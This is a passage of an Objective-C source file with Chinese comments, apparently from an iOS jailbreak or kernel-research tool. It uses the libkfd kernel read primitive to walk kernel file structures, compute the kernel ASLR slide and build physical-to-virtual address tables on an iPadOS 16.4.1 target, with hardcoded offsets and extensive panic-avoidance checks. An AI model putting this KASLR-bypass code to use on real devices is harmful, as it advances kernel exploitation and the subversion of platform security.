//
//  KernelSlide.m
//  Aether
//
//  职责与依赖面见 KernelSlide.h。本文件做三件事，顺序即数据流：
//    ① 从「本进程的一条 vnode 描述符」反查出运行时 vn_kqfilter；
//    ② 用 XPF 给的链接期 vn_kqfilter 相减得到 kernel slide，再用「链接基址 + slide」
//       处的 Mach-O 头自检 —— 链接基址优先取 XPF 现读的 gXPF.kernelBase
//       （km_xpf_kernel_base()），取不到才退回兜底常量。两者在 ARM_LARGE_MEMORY
//       机型上相差整 2 TB，写死常量就等于把自检那次 kread 打到未映射地址上
//       （见 KM_SLIDE_LINK_ADDR_FALLBACK 的注释）；
//    ③ 读回 ptov_table 与 gVirtBase/gPhysBase/gPhysSize，提供 PA → KVA 换算。
//
//  ②里还有一条顺序纪律：**自检发出那次 kread 之前，先把当时的全部数值落盘**
//  （Documents/kernelslide-diag.txt）。那一次读若地址不对，代价是内核态 data abort
//  → 整机重启，而内存里的诊断是随重启一起没的（上一次彩屏就是这么丢掉全部现场
//  数值的）。落盘是异步 + 有界等待，绝不无限拖住这条读链 —— 理由见
//  slide_dump_diag_and_wait()。
//
//  算法原文在 Aether/libmemrw/kfd/libkfd/perf.h：slide（含自检）是 perf.h:90-118
//  的前半段，换算表读取是 perf.h:150-163，phystokv 是 perf.h:232-248。
//  本文件逐行对照它实现，只换掉两处**来源**：
//    · dynamic_info(kernelcache__vn_kqfilter) → XPF 的 kernelSymbol.vn_kqfilter
//      （dynamic_info.h 里 kernelcache__* 整列为 0，那条来源已经不存在）；
//    · kread(kfd, …) → KernelMemory.h 的 km_read / km_read64。
//
//  刻意**不**做的事（不是遗漏，是止损纪律）：
//    perf_run 的剩余部分 —— /dev/aes_0 的 si_rdev 改写成 perfmon、遍历 cdevsw、
//    初始化 perfmon 设备 —— 属于 perf 通道的建路步骤。那条路一旦失败就会跳过
//    puaf_cleanup，把残留 vm_map 留给后续操作踩（KernelMemory.m 里记着这条
//    panic 链的完整证据）。本模块只要 vn_kqfilter 这一个值，不需要 perf 通道，
//    所以也不碰 dynamic_info 的 perf_supported。
//
//  本文件不 #include "libkfd.h"：那是 header-only 且 kopen/kread/kwrite 都是非
//  static 定义，第二个 include 点会撞重复符号（KernelMemory.m 头部的规矩）。
//

#import "KernelSlide.h"

#import "KernelMemory.h"
#import "XpfBridge.h"

#include <dispatch/dispatch.h>   /* 落盘必须走后台队列：观测不能长在被观测的路径上 */
#include <errno.h>
#include <fcntl.h>
#include <limits.h>              /* PATH_MAX：落盘路径缓冲 */
#include <pthread.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>              /* malloc/free：异步落盘的内容要在堆上带过去 */
#include <string.h>
#include <sys/qos.h>             /* QOS_CLASS_USER_INITIATED：不指望 dispatch 头转引它 */
#include <time.h>                /* clock_gettime：等落盘写完的那个上限 */
#include <unistd.h>

#pragma mark - 常量：值从哪来，为什么可以写死（以及哪些不能再写死）

/*
 * 链接基址的**兜底常量**：kernelcache 里 Mach-O 头所在段的链接期 vmaddr
 * （就是 XPF 的 macho_get_base_address() 会返回的那个数，实现见
 * libxpf/choma/MachO.c:517-537：扫 LC_SEGMENT_64 取最小 vmaddr，
 * 排除 __PRELINK / __PLK / __PAGEZERO）。
 *
 * 它为什么只是兜底、不能当真值 —— 链接基址由内核的构建配置决定，至少存在
 * 两个域，二者相差整 2 TB：
 *
 *     本机（ARM_LARGE_MEMORY 内核）   0xfffffe0007004000
 *     上游 libkfd 抄出来的那一个       0xfffffff007004000     ← 本文件原值
 *                         差值        0x1f000000000（= 2 TB，不是手抄错，是换域）
 *
 * 本文件原来用的就是后者，出处是 libkfd/info/static_info.h:12 的 ARM64_LINK_ADDR；
 * 而 static_info.h:8-12 自己标着那个值的来源是 xnu 的 makedefs/MakeInc.def ——
 * 那是个**构建期派生**的数。kfd 把它抄成跨机型常量，于是错到本机头上。
 *
 * 本机取值的三份互相独立的证据：
 *   ① 设备 panic 全文（docs/Slide彩屏取证.md §3.3）里三对 (base, slide) 反解出
 *      同一个链接基址，三对都吻合：
 *        KernelCache      0xfffffe001f560000 − 0x1855c000 = 0xfffffe0007004000
 *        Kernel text      0xfffffe001f568000 − 0x18564000 = 0xfffffe0007004000
 *        Kernel text exec 0xfffffe00204b8000 − 0x194b4000 = 0xfffffe0007004000
 *      （KernelCache slide 与 Kernel slide 差 0x8000，与两个 base 差的 0x8000 同源，
 *        所以配对相减后是同一个数 —— 这条自洽本身也是一份旁证。）
 *   ② 上游 XPF 自己把这个值硬编码过一次：libxpf/xpf/common.c:187
 *      `gXPF.kernelBase == 0xfffffe0007004000`，注释写明它是用来判
 *      "ARM_LARGE_MEMORY kernels" 的 —— 即这一类机器上 gXPF.kernelBase 实测就是它。
 *   ③ XPF 在本机解析成功的链接期符号全落在 0xfffffe0007xxxxxx
 *      （kernelSymbol.ptov_table = 0xfffffe00079d3180），与本值同域，
 *      与旧常量（0xfffffff0… 域）不同域。
 *
 * 错这个数的代价（彩屏的直接对症）：slide_verify_kernel_base 拿
 * 「链接基址 + candidate」去 kread，而 kread 是让**内核**按内核语义解引用该地址 ——
 * 偏 2 TB 就是打在一个未映射的地址上：内核态 data abort，整机重启。
 * 更阴的一点：0xfffffff007004000 本身"看着像一个完全合法的内核地址"，
 * km_slide_kernel_ptr 的三道形态检查一道也拦不住它。
 *
 * 采信顺序是「XPF 现读 > 本常量」（见 slide_link_base）。常量仍然留着，是因为
 * 它是目标机口径的值：XPF 万一没跑起来，用它比用别人的域强。
 */
#define KM_SLIDE_LINK_ADDR_FALLBACK 0xfffffe0007004000ULL

/*
 * 下面三个结构体偏移由 libkfd/info/static_info.h 的字段布局推出来
 * （fileproc :316 / fileops :342 / fileglob :353），这里逐条写清楚，
 * 因为本文件**不能** include 那个头：它属于 libkfd，且自带一个非 static 的
 * 变量定义（static_info.h:112 的 msg_ool_size_small），第二个 include 点
 * 会在链接期撞重复符号。
 *
 *   struct fileproc（static_info.h:316-326）
 *       u32 fp_iocount @0x00, u32 fp_vflags @0x04,
 *       u16 fp_flags @0x08, u16 fp_guard_attrs @0x0a,
 *       [4 字节对齐填充] → u64 fp_glob @0x10
 *   struct fileglob（static_info.h:353-368）
 *       f_msglist{le_next,le_prev} @0x00..0x0f, u32 fg_flag @0x10,
 *       u32 fg_count @0x14, u32 fg_msgcount @0x18, i32 fg_lflags @0x1c,
 *       u64 fg_cred @0x20 → u64 fg_ops @0x28
 *   struct fileops（static_info.h:342-351）
 *       file_type_t fo_type @0x00（4 字节）,[4 字节对齐填充],
 *       fo_read @0x08, fo_write @0x10, fo_ioctl @0x18, fo_select @0x20,
 *       fo_close @0x28 → fo_kqfilter @0x30
 *
 * 这三个偏移是 BSD 结构体内部的字段位置，不随内核版本变（kfd 的 perf_run
 * 就靠它们工作）。万一哪天真变了，症状是这里读出的 fo_kqfilter 过不了形态
 * 检查 → 立刻失败退出，不会拿着错地址继续下读。
 */
#define KM_OFF_FILEPROC_FP_GLOB    0x10ULL
#define KM_OFF_FILEGLOB_FG_OPS     0x28ULL
#define KM_OFF_FILEOPS_FO_KQFILTER 0x30ULL

/*
 * 内核地址空间下界 VM_MIN_KERNEL_ADDRESS（xnu arm64，T1SZ_BOOT = 17 时即此值）。
 *
 * 为什么 KernelMemory 的 km_is_kernel_address 不够：它判的是
 * `(addr >> 48) == 0xFFFF`，而 0xffff000000000000 / 0xffff800000000000 这类值
 * 同样满足，却完全不在内核映射区里 —— 送进 kread 就是内核态 data abort。
 * 这里多加一道下界把那一类挡掉：能进 kread 的地址必须同时满足两条。
 */
#define KM_SLIDE_VM_MIN_KERNEL 0xfffffe0000000000ULL

/* ptov_table 的项数与每项大小（libkfd.h:83-87 的 struct ptov_table_entry[8]，
 * 每项是 pa / va / len 三个 u64 = 24 字节；下面的表按 sizeof 取，不另写字节数）。 */
#define KM_SLIDE_PTOV_COUNT 8ULL

/* kernelcache 头两个 32 位字：MH_MAGIC_64 与 cputype（CPU_TYPE_ARM64|ABI64）。 */
#define KM_SLIDE_MH_MAGIC   0xfeedfacfU
#define KM_SLIDE_MH_CPUTYPE 0x0100000cU

/*
 * 自己 open 出来的 fd 必然是小的整数（进程的 ofiles 数组长度在几百量级）。
 * 给个上界，用来挡「fd_ofiles 其实是个错值、而 fd 索引偏大」这类形态：
 * 越过上界就说明读取的起点不对，此时再去读 fileproc 是往未验证地址下钻。
 */
#define KM_SLIDE_MAX_FD 1024

/*
 * slide 的合理上界（64 GB）。真机 slide 在 GB 量级；越过它说明 vn_kqfilter 或
 * XPF 值取错了，在拼 kernel_base 之前就该停下。
 */
#define KM_SLIDE_MAX_VALUE 0x1000000000ULL

/*
 * 内核映像窗口的宽度（64 GB，与 KM_SLIDE_MAX_VALUE 数值相同、用途不同：那一个卡
 * slide 自身，这一个卡「链接基址 + slide」，见 slide_candidate_fits_image）。
 * 窗口 = [VM_MIN_KERNEL_ADDRESS, VM_MIN_KERNEL_ADDRESS + 本常量)。
 *
 * 依据（都是 panic 全文里的实测，docs/Slide彩屏取证.md §2）：
 *   · 本次启动的内核映像落在窗口很靠下的位置（KernelCache base
 *     0xfffffe001f560000，约窗口起点 + 0.5 GB）；
 *   · zone 堆区 GEN0 起于 0xfffffe113bb18000，高于窗口上界 0xfffffe1000000000。
 * 取 64 GB 是"宽松但够用"：真机 slide 在 GB 量级，映像永远够不到上界，
 * 而任何跨域的错基址（例如差 2 TB 的那个）都必然落到窗口外。
 */
#define KM_SLIDE_IMAGE_SPAN 0x1000000000ULL

/*
 * 链接期符号相对链接基址的允许偏移上界（1 GB）。纯算术的自洽检查：基址必须
 * **低于**它底下的每一个映像符号，且差距不能大到像是两块不同的映像。
 * 本机实测 kernelSymbol.ptov_table = 0xfffffe00079d3180，距基址 0x9cf180（≈10 MB），
 * 离 1 GB 很远；基址取错域时（差值 2 TB）符号会落到基址**之下**，这条立刻失败。
 * 上界给得宽是刻意的：它要挡的是量级错误，不是几十 MB 的出入。
 */
#define KM_SLIDE_IMAGE_SYMBOL_MAX_OFFSET 0x40000000ULL

/*
 * 自检前落盘的文件名（App 沙盒 Documents 目录下）。固定名字、整份覆盖写：
 * 要的是"崩之前那一刻"的快照，不是历史记录 —— 上一次彩屏丢掉的正是那一刻。
 */
#define KM_SLIDE_DIAG_FILE_NAME "kernelslide-diag.txt"

/*
 * 等落盘写完的上限（毫秒）。为什么会同时需要"先写后读"和"不许拖住读链"，
 * 以及这个上限为什么是 2 秒，见 slide_dump_diag_and_wait() 的注释。
 */
#define KM_SLIDE_DUMP_TIMEOUT_MS 2000

/*
 * 用来取 vnode 描述符的候选文件。
 *
 * 为什么要「一条普通文件的 fd」：slide 的算法要读 fileops.fo_kqfilter，而它只能
 * 从一条已打开的 fd 的 fileglob 里取（perf.h:97-106）。
 *
 * 为什么**不**用 kfd 的 /dev/aes_0：kfd 用它是因为下一步要把这个描述符的
 * vnode → specinfo.si_rdev 改写成 perfmon 的 major，把 fd 伪装成
 * /dev/perfmon_core（perf.h:120-145）。那是 perf 通道的建路步骤，本模块不做。
 * 我们只要 fo_kqfilter。
 *
 * 而 fo_kqfilter 对**所有 vnode 是同一个函数**：内核里 DTYPE_VNODE 的文件共用
 * 一张 `static const struct fileops vnodeops`（bsd/vfs/vfs_vnops.c），它的
 * fo_kqfilter 恒为 vn_kqfilter。这与具体设备、具体文件都无关，所以任何能打开的
 * 普通文件都等价 —— 挑一个必定存在的系统文件即可。顺带把权限面收到最小：
 * kfd 用 O_RDWR（后面要 ioctl），我们只用 O_RDONLY。
 *
 * 三个候选按「必定存在」排序，逐个试；全失败时把各自 errno 一起报出来
 * （沙箱或 file-read-data 权限出问题时的症状就是这样）。
 */
static const char *const kSlideProbeFiles[] = {
    "/System/Library/CoreServices/SystemVersion.plist",
    "/usr/lib/dyld",
    "/System/Library/Frameworks/Foundation.framework/Foundation",
};

#pragma mark - 状态（进程内单例，全部在 g_slideLock 内读写）

/*
 * 为什么要有这把锁：底下的读是 kread（内核解引用），而 libkfd 的 kread 后端
 * **不是线程安全的**（kread_sem_open 每次读都要改写自己 psemnode 的 pinfo），
 * 这一点 KernelMemory.m 的 g_kernel_ready 注释里有完整说明。
 *
 * 面板侧有两个会 kread 的入口：本模块的 Slide 与 MemoryProbe 的读取链，两者都在
 * 后台线程跑。**调用方要保证它们不并发**（DebugProcView 让 Slide 也走
 * AutoTracker.syncExternal，与读取同一条串行队列）。
 * 这把锁保护的是**本模块自己的状态**，不是那把串行化的替代品。
 */
static pthread_mutex_t g_slideLock = PTHREAD_MUTEX_INITIALIZER;

/* ptov_table 的一项，字段与 libkfd.h:83-87 的 struct ptov_table_entry 对齐。 */
typedef struct {
    uint64_t pa;
    uint64_t va;
    uint64_t len;
} km_slide_ptov_entry;

/* 一次完整成功是否已经发生过（成功后再调 resolve 是空操作）。 */
static bool g_slideSettled = false;

/* slide 与 kernel base。自检通过之后才写，此后不再变。 */
static uint64_t g_slide = 0;
static uint64_t g_kernelBase = 0;

/*
 * PA → KVA 当前是否可用。置位的唯一地方是 slide_run_load_tables 的提交点，
 * 且提交前必须过 slide_fallback_usable()（三个基准各自在自己的域里）。
 *
 * 与旧语义的区别（本轮改动）：以前"就绪"隐含"ptov_table 也读到了"；现在 ptov_table
 * 读得不合法**不再**影响它。理由是真机实测（见 slide_read_ptov_table 上方那段注释）：
 * 那张表读到的是某个邻近标量全局、整张表是假的，而兜底公式
 * `pa - gPhysBase + gVirtBase` 与它无关 —— 把"可以不用"的东西当硬前置，代价是
 * 依赖 PA→KVA 的建表路径一步都走不了。
 */
static bool g_convertReady = false;

/*
 * 读回来的表 + 它是否**可信** —— 两个必须分开：
 *   · g_ptov 是"读到了什么"（不可信时按原样收下，诊断与锚点校验要用这份数据）；
 *   · g_ptovTrusted 是"能不能拿它算地址"（判据见 slide_read_ptov_table）。
 * 查表只看后者（slide_phystokv_locked 的第一道分支）。
 */
static km_slide_ptov_entry g_ptov[KM_SLIDE_PTOV_COUNT];
static bool g_ptovTrusted = false;

static uint64_t g_virtBase = 0;
static uint64_t g_physBase = 0;
static uint64_t g_physSize = 0;

/*
 * 诊断文本。分两块缓冲：正文按执行顺序追加，最后把**摘要行**拼到最前面 ——
 * 摘要要跑完才知道内容，而面板（showReport）把第一行当状态行显示。
 * 不采用"先写正文再 memmove 腾出第一行"的做法：这块是静态定长缓冲，
 * memmove 一旦算错就是往自己身上踩，而这个代价换不来任何好处。
 */
#define KM_SLIDE_BODY_SIZE 5888
#define KM_SLIDE_TEXT_SIZE 6656
static char g_diagBody[KM_SLIDE_BODY_SIZE];
static char g_diagText[KM_SLIDE_TEXT_SIZE];

#pragma mark - 诊断文本

typedef struct {
    char  *buf;
    size_t cap;
    size_t used;
} km_slide_text;

/*
 * 诊断文本追加。
 *
 * 记账用**实际写入的字节数**（strlen），不能用 snprintf 的返回值 —— 截断时那个
 * 返回值大于可用空间，累加会越界。KernelMemory.m 的 km_self_test 里记着这条坑
 * （那里的缓冲区只有 512 字节，而且溢出踩的是 AppDelegate 的数组）。
 * 这里同样按 strlen 记账：used 恒 ≤ cap - 1，`cap - used` 永不回绕，
 * 最坏结果只是诊断被截断。
 */
static void text_append(km_slide_text *t, const char *format, ...)
{
    if (!t || t->used >= t->cap) return;

    va_list args;
    va_start(args, format);
    vsnprintf(t->buf + t->used, t->cap - t->used, format, args);
    va_end(args);

    t->used += strlen(t->buf + t->used);
}

static void slide_diag_reset(void)
{
    g_diagBody[0] = '\0';
    g_diagText[0] = '\0';
}

/// 把摘要行拼在正文之前，形成最终诊断文本。调用者必须已持有 g_slideLock。
static void slide_diag_finalize(const char *summary)
{
    snprintf(g_diagText, sizeof(g_diagText), "%s\n%s", summary, g_diagBody);
}

#pragma mark - 地址工具

/*
 * 内核指针形态检查 —— 三道，逐级收紧：
 *   ① 非 0、非全 1（~0ULL 是"字段没填 / 被 memset 成 0xff"的典型垃圾）；
 *   ② ≥ VM_MIN_KERNEL_ADDRESS（挡掉 0xffff0000… / 0xffff8000… 那一类）；
 *   ③ KernelMemory 的 km_is_kernel_address：`(addr >> 48) == 0xFFFF`
 *      —— 保留它，是为了与工程其余读路径口径一致。
 *
 * 它回答的仍然只是「像不像内核地址」，**不回答「已映射吗」** —— 后者本工程
 * 目前没有能力回答（要靠页表遍历，而遍历需要本模块算出的换算基准，方向相反）。
 * 所以每一次下钻还依赖另一个事实：待读的地址来自内核自己写下的数据。
 */
static bool km_slide_kernel_ptr(uint64_t addr)
{
    if (addr == 0 || addr == ~(uint64_t)0) return false;
    if (addr < KM_SLIDE_VM_MIN_KERNEL) return false;
    return km_is_kernel_address(addr);
}

/*
 * 指针的 PAC 还原。等价于 libkfd/info/static_info.h:96-100 的
 *     #define PTR_MASK      ONES(64 - T1SZ_BOOT)
 *     #define SIGN(p)       ((p) & BIT(55))
 *     #define UNSIGN_PTR(p) (SIGN(p) ? ((p) | PAC_MASK) : ((p) & ~PAC_MASK))
 * 其中 PAC_MASK = ~PTR_MASK。
 *
 * 为什么不能一把梭 `p & PTR_MASK`：高位是地址的符号扩展（内核地址高位全 1），
 * 而 PAC 只替换其中一段位。对本来就带高位全 1 的地址必须把高位**补回 1**，
 * 而不是清成 0 —— static_info.h 里那个三元表达式的两个分支就是为这件事存在的。
 *
 * T1SZ_BOOT 由调用方从 XPF 的 kernelConstant.T1SZ_BOOT 取（目标机实测 17），
 * 不写死：写死了在 T1SZ = 25 的机型上会把内核地址的高位切错。
 */
static uint64_t slide_unsign_ptr(uint64_t p, uint64_t t1sz)
{
    /* 调用方已把 t1sz 限制在 1..63；这一句只是不让位移制造 UB（t1sz = 0 时 1<<64）。 */
    if (t1sz < 1 || t1sz > 63) return p;

    const uint64_t ptrMask = (((uint64_t)1 << (64 - t1sz)) - 1);
    const uint64_t pacMask = ~ptrMask;
    return (p & ((uint64_t)1 << 55)) ? (p | pacMask) : (p & ptrMask);
}

/*
 * 跨线程共享的 T1SZ_BOOT 缓存 —— km_unsign_ptr 专用的那一份（另一份在 g_slideLinkBase
 * 那条 resolve 链上，由 g_slideLock 保护）。
 *
 * 取值与 slide_t1sz() 同源：XPF 的 kernelConstant.T1SZ_BOOT，取不到按目标机
 * （iPad14,3 / iPadOS 16.4.1）实测值 17 兜底，两边都不写死 —— 理由见上面
 * slide_unsign_ptr 的注释（T1SZ = 25 的机型上写死会把内核地址高位切错）。
 *
 * 0 = 还没解析过（哨兵）。这里是**无锁**的，所以它必须是 volatile，以免编译器把
 * 热路径上那次读优化掉之后再也看不到别的线程写进来的值。
 */
static volatile uint64_t g_unsignT1szCache = 0;

/// PAC_MASK 的形状来源，首次调用才解析并缓存。返回值恒落在 1..63。
static uint64_t slide_unsign_t1sz_cached(void)
{
    uint64_t value = g_unsignT1szCache;
    if (value != 0) return value;

    value = km_xpf_resolve_symbol(@"kernelConstant.T1SZ_BOOT");
    if (value < 1 || value > 63) value = 17;

    g_unsignT1szCache = value;
    return value;
}

/*
 * 换算核心的无锁版本：**调用者必须已持有 g_slideLock**。
 * 前向声明在这里，是因为 resolve 内部的抽样验证（slide_report_phystokv_probe）
 * 要用它 —— 那一处若改成调用公开的 km_phystokv()，就会在同一把锁上再取一次锁，
 * 直接把自己锁死。
 */
static uint64_t slide_phystokv_locked(uint64_t pa);

/// 读一个内核 64 位字。地址先过形态检查 —— 不合法就一次 kread 都不发。
static uint64_t slide_read64(uint64_t addr, bool *ok)
{
    if (ok) *ok = false;
    if (!km_slide_kernel_ptr(addr)) return 0;

    bool read_ok = false;
    const uint64_t value = km_read64(addr, &read_ok);
    if (ok) *ok = read_ok;
    return value;
}

/// 读一块内核内存（读 ptov_table 用）。同样先过形态检查。
///
/// 不拦"跨页"的读：ptov_table 是内核数据段里的定长数组，跨页时那两页都属于同一个
/// 连续映射的段；真正会出事的是符号地址算错，而那种情况已经被 slide 自检挡住
/// （自检不过就根本走不到这里）。
static bool slide_read_bulk(uint64_t addr, void *out, size_t len)
{
    if (!out || len == 0) return false;
    if (!km_slide_kernel_ptr(addr)) return false;
    return km_read(addr, out, (uint64_t)len);
}

/*
 * 读一个「本应是内核指针」的字段：地址过形态检查 → 读 → 值再过一次形态检查。
 * 链条上每一步都是它，所以失败文案才能统一成「哪一步 + 地址 + 读到的值」三件套。
 *
 * 返回的是**已还原 PAC** 的指针 —— 与上游一致（perf.h:104-105 每次拿地址之前都
 * 先 UNSIGN_PTR），调用方拿到就能直接加偏移，不必也不该再判一次形态。
 *
 * 注意形态检查必须在还原**之后**做：带 PAC 的值高 17 位可能是签名而不是地址，
 * 直接用 KM_SLIDE_VM_MIN_KERNEL 去卡它会把合法指针误判成垃圾。
 *
 * rawOut 非空时回传**原始读数**（未还原 PAC），读失败则回传 0。它存在的唯一理由是
 * 诊断：自检前落盘要把 fo_kqfilter 的原始读数与还原后的值一起写下来，否则崩了之后
 * 无法判断错值是在读取那一步、还是在 PAC 还原那一步产生的。链条上其它四步不需要它，
 * 传 NULL 即可 —— 不为诊断多读一次内核，那是白送一次彩屏窗口。
 */
static uint64_t slide_read_kernel_ptr(uint64_t addr, const char *field,
                                      uint64_t t1sz, km_slide_text *t,
                                      uint64_t *rawOut)
{
    if (rawOut) *rawOut = 0;

    if (!km_slide_kernel_ptr(addr)) {
        text_append(t, "  读 %s 失败：待读地址 %#llx 形态不合法（未发出 kread）\n",
                    field, (unsigned long long)addr);
        return 0;
    }

    bool ok = false;
    const uint64_t raw = slide_read64(addr, &ok);
    if (!ok) {
        text_append(t, "  读 %s 失败：%#llx 两次读不一致（%#llx）\n",
                    field, (unsigned long long)addr, (unsigned long long)raw);
        return 0;
    }

    if (rawOut) *rawOut = raw;

    const uint64_t pointer = slide_unsign_ptr(raw, t1sz);
    if (!km_slide_kernel_ptr(pointer)) {
        text_append(t, "  读 %s 失败：%#llx 处读到 %#llx（还原 PAC 后 %#llx）不是内核指针\n",
                    field, (unsigned long long)addr,
                    (unsigned long long)raw, (unsigned long long)pointer);
        return 0;
    }
    return pointer;
}

#pragma mark - 一次 resolve 的上下文

/*
 * 链接基址：一个值 + 它的来源。两个字段必须一起走 —— 诊断（面板与落盘）要能
 * 说清"这次用的是常量还是 XPF 现取"，因为这两份在 ARM_LARGE_MEMORY 机型上
 * 差整 2 TB，只报一个数就等于把最关键的判据藏起来。
 */
typedef struct {
    uint64_t addr;      /* 拿去拼 kernel_base 的那个值 */
    uint64_t xpfValue;  /* XPF 现取的原始值，0 = 没取到（拼地址时不会用它） */
    bool     fromXPF;   /* true = 采信 XPF；false = 退回兜底常量 */
} km_slide_link_base;

/*
 * 步骤之间传递的数据。只活在一个栈帧里，所以它自己不需要任何并发保护；
 * 全局状态只在最后一次性提交（见 slide_run_locked 的收尾）。
 */
typedef struct {
    int      fd;              /* 探测用文件描述符，-1 表示未打开 */
    uint64_t proc;            /* 本进程 struct proc 的内核地址 */
    uint64_t fdOfilesOffset;  /* struct proc 内 p_fd->fd_ofiles 的偏移 */
    uint64_t t1sz;            /* T1SZ_BOOT，PAC 掩码的来源 */
    uint64_t foKqfilter;      /* 运行时 vn_kqfilter（已还原 PAC） */
    uint64_t foKqfilterRaw;   /* 它的**原始读数**（未还原 PAC）—— 只进诊断：
                               * 崩了之后要能从这两个数看出 PAC 还原是否参与了错值 */
    uint64_t linkedVnKqfilter;/* XPF 给的链接期 vn_kqfilter（求 slide 的减数） */
    km_slide_link_base linkBase; /* 链接基址 + 来源（见上面那个结构体的注释） */
    bool     dumpSettled;     /* 自检前那次落盘是否在窗口内写完（false 只是一条
                               * 诊断事实，不改变流程 —— 落盘不许当门闸） */
    bool     slideVerified;   /* ⑤ 自检是否通过 —— 不能用 slide != 0 代替：
                               * 内核没开 ASLR 时 slide 合法地为 0，那时"0"是值不是标志 */
    uint64_t slide;
    uint64_t kernelBase;
    km_slide_ptov_entry ptov[KM_SLIDE_PTOV_COUNT];
    bool     ptovTrusted;     /* ⑥ 的三道判据（整表形态 + ① 偏移恒定 + ② va 值域）
                               * 是否全过 —— 只有它为真，提交出去的表才参与查表。
                               * 它为假**不是**失败：兜底公式不依赖那张表。 */
    uint64_t virtBase;
    uint64_t physBase;
    uint64_t physSize;
    char     failure[160];    /* 非空 = 失败在哪一步（摘要行用），空 = 成功 */
} km_slide_run;

/*
 * 统一的拒绝出口：把「哪一步 + 具体原因」写进上下文摘要，细节早已按行写进诊断
 * 正文。每一步失败都走这里，面板才能一眼说出卡在哪一步，而不是只看到一串地址。
 */
static bool slide_refuse(km_slide_run *run, km_slide_text *t, const char *step, const char *why)
{
    snprintf(run->failure, sizeof(run->failure), "%s — %s", step, why);
    text_append(t, "  ↳ 拒绝继续下读\n");
    return false;
}

#pragma mark - 步骤①：前置与 vnode 描述符

/*
 * T1SZ_BOOT：内核地址的有效位数（64 − T1SZ_BOOT 是地址位宽），决定 PAC 掩码的
 * 形状。取值随设备变，所以从 XPF 的 kernelConstant.T1SZ_BOOT 取，不写死。
 *
 * 取不到时按目标机（iPad14,3 / iPadOS 16.4.1）实测值 17 兜底，并把这件事写进
 * 诊断。兜底是安全的：如果兜底值与设备真实值不同，下面每一步的形态检查会立刻
 * 失败（而不是算出一个貌似合理的错地址）—— 因为高位切错后地址必然跌出
 * [VM_MIN_KERNEL_ADDRESS, 0xffffffffffffffff]。
 */
static uint64_t slide_t1sz(km_slide_text *t)
{
    const uint64_t value = km_xpf_resolve_symbol(@"kernelConstant.T1SZ_BOOT");
    if (value >= 1 && value <= 63) {
        text_append(t, "  T1SZ_BOOT=%llu（XPF）\n", (unsigned long long)value);
        return value;
    }
    text_append(t, "  T1SZ_BOOT 取不到（XPF 值=%llu），按目标机实测值 17 兜底\n",
                (unsigned long long)value);
    return 17;
}

/*
 * 打开一条普通文件，拿一个 DTYPE_VNODE 的描述符。
 * 候选、以及「为什么任何 vnode 都行」见 kSlideProbeFiles 的注释。
 */
static bool slide_open_probe_file(km_slide_run *run, km_slide_text *t)
{
    const size_t count = sizeof(kSlideProbeFiles) / sizeof(kSlideProbeFiles[0]);
    for (size_t i = 0; i < count; i++) {
        const char *path = kSlideProbeFiles[i];
        const int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            text_append(t, "  开文件成功：fd=%d ← %s\n", fd, path);
            run->fd = fd;
            return true;
        }
        text_append(t, "  open(%s) 失败：errno=%d (%s)\n", path, errno, strerror(errno));
    }
    return slide_refuse(run, t, "② 取 vnode 描述符", "三个候选文件都打不开（见上面的 errno）");
}

static bool slide_run_prepare(km_slide_run *run, km_slide_text *t)
{
    run->proc = km_current_proc();
    run->fdOfilesOffset = km_proc_fd_ofiles_offset();

    /*
     * 地址来自 info_run 的反查结果（不是我们算的），偏移来自版本表 ——
     * 两者都不发 kread，所以这里只做形态检查，不构成下钻风险。
     */
    if (!km_slide_kernel_ptr(run->proc) || run->fdOfilesOffset == 0) {
        text_append(t, "① 前置失败：current_proc=%#llx（需为内核地址） fd_ofiles 偏移=%#llx（需非 0）\n",
                    (unsigned long long)run->proc,
                    (unsigned long long)run->fdOfilesOffset);
        return slide_refuse(run, t, "① 前置", "current_proc 或 fd_ofiles 偏移不可用（内核层未就绪？）");
    }
    text_append(t, "① current_proc=%#llx  fd_ofiles 偏移=%#llx\n",
                (unsigned long long)run->proc,
                (unsigned long long)run->fdOfilesOffset);

    run->t1sz = slide_t1sz(t);
    return slide_open_probe_file(run, t);
}

#pragma mark - 链接基址：XPF 现取优先，兜底常量垫底

/*
 * 链接基址的来源与采信顺序（两者在 ARM_LARGE_MEMORY 机型上差整 2 TB，
 * 见 KM_SLIDE_LINK_ADDR_FALLBACK 的注释）。
 *
 * 为什么 XPF 优先：gXPF.kernelBase 是**设备上这份 kernelcache 现读**出来的
 * （libxpf/xpf/xpf.c:563 → MachO.c:517-537），它跟着设备走；常量则是目标机口径的
 * 一份一次性抄本（上游那份抄的还是另一种构建配置的值）。诊断里两个数都会原样打
 * 出来（面板与落盘各两行），所以常量万一还是不对，下次上机一次点击就能看到该改
 * 成什么 —— 这正是上一版彩屏最缺的那条读数。
 *
 * XPF 的值仍然要过 km_slide_kernel_ptr 那三道形态检查：它是拼 kernel_base 的输入，
 * 错一个字节的后果就是内核态 data abort。0（没取到）与 UINT64_MAX（xpf.c:587 的
 * 失败哨兵）都会被那三道挡下。注意检查通过只说明"像内核地址"，不说明"已映射"——
 * 后者正是紧接着的自检要回答的问题。
 */
static km_slide_link_base slide_link_base(km_slide_text *t)
{
    km_slide_link_base base;
    base.xpfValue = km_xpf_kernel_base();
    base.fromXPF = (base.xpfValue != 0) && km_slide_kernel_ptr(base.xpfValue);
    base.addr = base.fromXPF ? base.xpfValue : KM_SLIDE_LINK_ADDR_FALLBACK;

    /*
     * 这两行的键名（link_const / link_xpf）与落盘文件头部逐字相同，是刻意的固定
     * 格式：面板与文件要能并排比，事后从文件里一眼读出"当时用的是哪个"，不必回头
     * 去翻代码或猜版本。
     */
    text_append(t, "  link_const=%#llx（本文件兜底常量，目标机口径）\n",
                (unsigned long long)KM_SLIDE_LINK_ADDR_FALLBACK);
    text_append(t, "  link_xpf=%#llx%s\n",
                (unsigned long long)base.xpfValue,
                base.fromXPF ? "（XPF 现读）" : "（XPF 没给可用值）");
    text_append(t, "  链接基址采用=%#llx（来源：%s）\n",
                (unsigned long long)base.addr,
                base.fromXPF ? "XPF 现取" : "兜底常量");
    return base;
}

/*
 * 候选值的独立约束（纯算术，一次 kread 都不发）。
 *
 * 为什么这道值得有：自检真正验证的事只有一件 ——「链接基址 + candidate」处是不是
 * Mach-O 头。若链接基址取自错域（例如 XPF 拿不到、退回的常量又不是本机口径的），
 * 那个待读地址会落到内核映像区之外，也就是未映射地址上；而 kread 是让**内核**去
 * 解引用它 —— 彩屏。这道判据在发出读之前就能把这一类挡回"失败"，代价为零。
 *
